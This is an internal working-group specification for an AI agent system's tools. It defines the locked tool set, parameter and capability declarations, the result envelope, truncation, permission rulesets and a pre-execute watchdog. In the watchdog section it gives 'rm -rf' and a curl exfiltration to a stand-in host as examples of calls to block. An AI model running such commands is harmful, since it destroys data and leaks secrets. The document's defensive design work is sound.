---
title: Tools
description: The tool contract. The locked fundamental set, what every tool must self-describe, the result envelope, truncation, and how permissions are evaluated at the tool-call boundary.
keywords:
  [
    agent-system,
    tools,
    locked-set,
    self-describe,
    permissions,
    result,
    truncation,
    watchdog,
  ]
format: md
tags:
  - internal
  - wg
  - agent-system
---

# Tools

A **tool** is a callable capability exposed to the agent. Every tool
— locked, agent-specific, MCP, plugin-defined — obeys the same
contract: self-describing parameters, declared capability
requirements, a uniform result envelope. The agent loop sees one
shape; the model learns one mental model.

## Tool contract

A tool MUST publish:

| Field         | Type                       | Required | Description                                                                                      |
| ------------- | -------------------------- | -------- | ------------------------------------------------------------------------------------------------ |
| `id`          | string                     | yes      | Stable identifier. Reused across agents and across sessions.                                     |
| `description` | string                     | yes      | Prose the model reads to decide whether to call.                                                 |
| `parameters`  | JSON Schema                | yes      | Validated by the runtime before `execute`. A schema failure is a tool error, not an exception.   |
| `requires`    | RequirementSet             | yes      | The capability surface this tool needs. See [Capability requirements](#capability-requirements). |
| `execute`     | `(args, runtime) → Result` | yes      | The runtime hands a typed capability surface; the tool calls into it.                            |

The runtime computes the **effective capability set** for the agent
as the union of the agent manifest's `requires` and every tool's
`requires`. Adding a tool to an agent MUST automatically extend the
sandbox; the manifest does not need a parallel update.

## Locked fundamental tools

Every implementation that advertises the locked structured-tool
profile MUST ship the locked set. Models trained on tool use have
learned these names; renaming `read` to something else measurably
degrades quality. The set is the smallest union of what a code agent,
a design agent, and a research agent all need.

| Id            | Purpose                                                                   | Capability declared                                |
| ------------- | ------------------------------------------------------------------------- | -------------------------------------------------- |
| `read`        | Read a file from the root                                                 | `fs.read`                                          |
| `write`       | Create or overwrite a file in the root                                    | `fs.write`                                         |
| `edit`        | String-replace edit on an existing file                                   | `fs.read` + `fs.write`                             |
| `glob`        | Discover filesystem entries by path / pattern                             | `fs.read`                                          |
| `grep`        | Regex search across the root                                              | `fs.read`                                          |
| `bash`        | Run a shell command under a sub-policy                                    | `shell.run` (per-call sub-policy)                  |
| `todo`        | Write a todo list to a session-scoped store                               | none (session-internal)                            |
| `task`        | Spawn a subagent — see [`subagents`](./subagents.md)                      | derived from parent                                |
| `question`    | Pause and ask the user a structured question                              | none (host-mediated, synchronous)                  |
| `web_search`  | Search the web                                                            | `net.fetch` (against the configured provider host) |
| `web_fetch`   | Fetch a URL and convert to text                                           | `net.fetch`                                        |
| `skill`       | Load a discovered skill's body into context — see [`skills`](./skills.md) | none (session-internal index)                      |
| `tool_search` | Discover MCP / extension tools by query — see [`mcp`](./mcp.md)           | none (session-internal index)                      |

The locked set is **non-opinionated**. Each tool is the smallest thing
it can be:

- `edit` is string-replace, not a model-of-the-codebase.
- `bash` is a single command, not a shell session.
- `web_search` is a query + results, not a crawler.
- `task` is a synchronous (or background) call, not a workflow engine.

Implementors who need richer behavior layer it via MCP, plugin tools,
or agent-specific tools. They MUST NOT redefine the locked id with a
richer shape — the lock guarantees portability.

Filesystem discovery is in the lock because an agent often needs to
orient itself before it knows what to read. The shape must stay
**scoped**: a conforming `glob` / directory-listing binding returns
entries for an explicit path or pattern, marks truncation, and never
implies that a partial result is the whole workspace. Whole-repository
enumeration is a poor default on real filesystems because it competes
with faster native search tools, leaks backend indexing limits into
reasoning, and can make the model trust an incomplete inventory. Hosts
with a virtual filesystem may still need the structured discovery tool
because there may be no shell, no `find`, and no `rg`. A real-fs
profile that intentionally relies on shell/search commands for
discovery should document that product choice in its binding instead
of shipping a misleading whole-index list tool.

**Common extensions seen on top of the lock.** A code-shaped agent
typically ships additional tools beyond the lock. Names are not
standardized, but a recurring catalog includes:

| Tool                 | What it does                                                                         |
| -------------------- | ------------------------------------------------------------------------------------ |
| `repo_clone`         | Clone a remote repository into the workspace.                                        |
| `repo_overview`      | Return a structural summary of a repository (file tree + language stats).            |
| `apply_patch`        | Apply a unified-diff patch atomically across multiple files.                         |
| `lsp`                | Surface language-server features (definitions, references, diagnostics).             |
| `plan` / `plan_exit` | The plan/build opinionated workflow's exit hook (see [`subagents`](./subagents.md)). |
| `view_image`         | SEE a source as pixels — the visual twin of `read` (see [`vision`](./vision.md)).    |

These are deliberately out of the lock because they are domain
(code-agent) tools, not universal. `view_image` is the exception that
proves the rule: it is near-universal but stays out of the lock because
the locked read tool is deliberately **text-only** — perception is a
separate modality, not a richer `read`. See
[`visual perception`](./vision.md) for the read/view split. A design-agent or document-agent
host can ship its own equivalents without colliding.

### The `question` tool

The only locked tool that **pauses the run on a human**. The agent
emits one or more structured questions; the loop suspends until the
host returns answers. Headless hosts (CI, scheduled agents, hosted
batch) MUST treat `question` as a tool error with a fixed message —
the model gets the refusal in its next turn and falls back to its
best guess.

```ts
question({
  questions: [
    {
      question: string,
      header?: string,
      options?: { label: string, description?: string }[],
      multi_select?: boolean,
    }
  ]
}) → { answers: string[][] }   // one array per question
```

The question tool is in the lock because the difference between an
agent that asks and one that guesses is product-shaping, not optional.
Putting it in the lock means every host wires a question UI (or the
headless refusal) **once**, instead of every agent author re-inventing
it.

### The `task` subagent tool

`task` is in the lock because subagents are a primitive, not a
feature. An agent that cannot delegate has a fundamentally different
shape from one that can. See [`subagents`](./subagents.md) for the
recursion model, permission inheritance, and inspectability.

### The `skill` and `tool_search` tools

Both exist to **shrink the context the model sees** while still
letting it reach for things it did not load up front. Skills appear
in the system prompt as one-line descriptions; their bodies load on
demand through `skill`. MCP tools, when many, live in an index the
model searches with `tool_search`; only the searched-for tools wire
in. See [`skills`](./skills.md) and [`mcp`](./mcp.md).

### Web search

A fundamental tool that is not implementable in-house. The model needs
it; the host wires a real provider (search APIs, hosted search
endpoints).

The shape on the wire:

```ts
web_search({
  query: string,
  max_results?: int,
}) → { results: { title, url, snippet }[] }
```

Provider seam: the provider is the host's choice and SHOULD be
**stable per session** (hash the session id to pick) so a flaky
provider fails consistently and inspection sees one row, not a
random walk.

Cost / quota: the tool implementation MUST cap per-session calls and
MUST time out individual calls. Both numbers are host config; sensible
defaults are 25 calls/session and 15s per call.

## Capability requirements

A tool's `requires` declares the runtime surface it depends on:

```ts
RequirementSet = {
  fs?: {
    read?:  PathPattern[],     // patterns relative to the workspace root
    write?: PathPattern[],
  },
  net?: {
    hosts?: HostPattern[],     // outbound hosts the tool may reach
  },
  shell?: ShellRunRequirement[],   // see ShellRunRequirement below
  capabilities?: CapabilityName[], // any capability not covered above
}

ShellRunRequirement = {
  cmd: string,           // executable name, e.g. "git", "ls", "node"
  args?: ArgPattern[],   // ordered patterns matched against argv[1..]
}

ArgPattern =
  | string                          // exact-match
  | { wildcard: true }              // matches one positional arg
  | { prefix: string }              // matches an arg starting with the prefix
```

Path and host patterns SUPPORT variable expansion. The standard
variables:

| Variable      | Expands to                                                              |
| ------------- | ----------------------------------------------------------------------- |
| `{workspace}` | The workspace root (and any additional roots the manifest declares).    |
| `{ad-hoc}`    | Directories of currently-open ad-hoc files when the host supports them. |
| `{user-data}` | The host's per-user data directory.                                     |

Empty expansion (e.g. `{workspace}` with no open workspace) yields an
empty effective scope; the tool's calls fail closed. An undefined
variable name (typo) MUST throw at manifest compile time.

## Tool result envelope

Every tool returns the same envelope:

```ts
{
  type: "output" | "error",
  data: <tool-specific JSON>,     // when "output"
  error_text: string,             // when "error"
  metadata: {
    duration_ms: int,
    truncated?: bool,             // see Truncation below
    output_path?: string,         // see Truncation below
  }
}
```

The uniform envelope serves three downstream layers:

- The recorder, which writes the result to a `chat_parts` row.
- The replay layer, which re-emits the result deterministically.
- The model itself, which develops one mental model for "what comes
  back from a tool."

## Truncation

Tool outputs can be enormous (a `grep` over a large repository, a long
file `read`). The runtime applies a per-tool max output size; bytes
beyond that go to a sidecar file path, and the result carries the
head + a `truncated: true` flag.

```ts
{
  type: "output",
  data: { head: "<first N bytes>", … },
  metadata: {
    truncated: true,
    output_path: "/tmp/grep-output-prt_…",
  }
}
```

The model sees the head and the path; if it needs more, it calls
`read` on the path. The sidecar file lives under the host's per-session
working directory; the runtime cleans it up when the session closes.

Per-tool defaults (recommended):

| Tool        | Default max output            | Notes                                                                   |
| ----------- | ----------------------------- | ----------------------------------------------------------------------- |
| `read`      | 200 KB                        | Larger reads go through `read` with byte ranges, not the truncate path. |
| `glob`      | 1000 entries                  | The 1001st triggers truncation.                                         |
| `grep`      | 200 matches                   | Same.                                                                   |
| `bash`      | 200 KB combined stdout+stderr | Anything past goes to the sidecar path.                                 |
| `web_fetch` | 200 KB                        | After text extraction; not raw HTML.                                    |
| Other       | implementation-defined        |                                                                         |

Hosts MAY tune these per product. The shape (head + `output_path`)
is fixed.

## Permissions at the tool boundary

Permissions are **a ruleset, not an allowlist**. A rule is
`(permission, pattern, action)`:

- `permission`: a tool id (`bash`), a capability name (`fs.write`),
  or a wildcard (`*`).
- `pattern`: the argument pattern the rule applies to (a shell
  command pattern, a filesystem path, an HTTP host). Patterns
  support glob (`**/*.py`) and prefix matching.
- `action`: `allow` / `deny` / `ask`. Default `ask`.

### Rule sources

Rules layer across three scopes (manifest / session / project). The
**most specific matching rule wins**; a manifest deny CANNOT be
turned into an allow by a session or project rule. See
[`session / permission scopes`](./session.md#permission-scopes) for
the scope table and evaluation order, and
[`subagents / permission inheritance`](./subagents.md#permission-inheritance)
for the deny-inheritance rule.

### Headless hosts

Hosts without a user (CI, scheduled agents, hosted batch) MUST treat
`ask` as `deny`. The agent system MUST NOT invent answers.

## The watchdog

A pre-execute hook on every tool call. The watchdog sees the tool id,
the validated arguments, the agent's manifest, and the session id,
and returns one of:

- `allow` — the call proceeds.
- `deny(reason)` — the call fails. The model gets the reason as a
  tool error and can adjust on the next turn.
- `ask` — only on hosts with a human; the host shows the call, the
  user picks once / always / reject. Headless hosts treat as `deny`.

The watchdog is **pre-execute** because the damaging act of a
shell call (`rm -rf`, `curl <data> exfil.example.com`) is the call
itself. Post-call rejection is too late.

The watchdog is independent of capability scopes. It can refuse
calls that the manifest's `requires` would have allowed; it cannot
permit calls the manifest's `requires` would have refused. The
runtime's capability check runs **before** the watchdog as the
first defense.

### Defense in depth

Three independent layers, any one of which is sufficient for its
kind of failure:

1. **Capability check** — the runtime refuses out-of-scope paths and
   hosts at the API boundary. No model output reaches the OS.
2. **Watchdog** — refuses categories of arguments the capability
   check cannot express ("no commands that look like exfiltration").
3. **Environment sandbox** — refuses anything the runtime
   mis-let-through. See [`environments`](./environments.md).

A change to one layer SHOULD NOT require changes to the others.

## ACP tool kind taxonomy

When the agent is fronted by an [ACP](./acp.md) adapter, every
emitted tool call carries a `kind` (`read` / `edit` / `search` /
`execute` / `fetch` / `think` / `other` and a few more). The kind
drives client UI — icon, inline diff renderer, terminal pane.

The full mapping from locked tools to ACP kinds lives in
[`acp / tool kind mapping`](./acp.md#tool-kind-mapping). Hosts
without an ACP adapter ignore the taxonomy.

## Implementor checklist

A conforming tool implementation MUST:

- Publish `id`, `description`, JSON-schema `parameters`, and
  `requires` at registration.
- Validate `parameters` before calling `execute`. A schema failure
  yields a tool error with the schema validation message; it MUST
  NOT throw.
- Surface side effects only through the typed runtime — never reach
  into the host's filesystem, network, or shell directly.
- Return the uniform `{ type, data | error_text, metadata }` envelope.
- Honor the abort signal: when the session aborts, an in-flight tool
  SHOULD stop work and return an error or a partial result.

## See also

- [Foundations](./foundations.md) — the AI SDK chunk shape tool I/O
  rides on, and the streaming substrate.
- [Skills](./skills.md) — the `skill` tool's library.
- [MCP](./mcp.md) — the `tool_search` tool's catalog.
- [Subagents](./subagents.md) — the `task` tool's recursion model.
- [Environments](./environments.md) — which capabilities each
  environment exposes.
- [Cost Optimization](./cost-optimization.md) — why the result
  envelope and the truncation contract are billing surfaces: every
  byte a tool returns is re-billed on every subsequent step.
- [ACP integration](./acp.md) — the `kind` taxonomy and the
  `session/request_permission` wire.
